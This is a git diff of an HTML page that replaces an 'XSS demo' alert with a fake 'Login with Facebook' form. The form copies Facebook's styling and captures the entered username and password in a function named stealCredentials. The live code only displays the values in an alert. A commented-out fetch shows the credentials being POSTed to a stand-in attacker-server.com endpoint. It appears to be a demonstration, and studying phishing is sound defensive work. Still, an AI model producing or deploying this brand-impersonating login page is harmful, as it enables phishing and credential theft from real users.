@@ -3,15 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GitHub XSS Demo</title>
+    <title>Login with Facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .login-box input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .login-box button {
+            width: 95%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to My GitHub Page</h1>
-    <p>This page contains an XSS payload for demonstration purposes.</p>
+    <div class="login-box">
+        <h2>Login with Facebook</h2>
+        <p>Please enter your credentials</p>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Facebook Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="button" onclick="stealCredentials()">Login</button>
+        </form>
+    </div>
 
     <script>
-        // XSS payload that triggers an alert when the page is loaded
-        alert('XSS payload executed!');
+        function stealCredentials() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            alert("Credentials stolen: Username: " + username + " Password: " + password);
+
+            // In a real-world phishing attack, this is where credentials would be sent to an attacker's server
+            // Example of sending data to an attacker's server
+            // fetch('http://attacker-server.com/steal', {
+            //     method: 'POST',
+            //     headers: {
+            //         'Content-Type': 'application/json',
+            //     },
+            //     body: JSON.stringify({ username: username, password: password }),
+            // });
+        }
     </script>
 </body>
 </html>
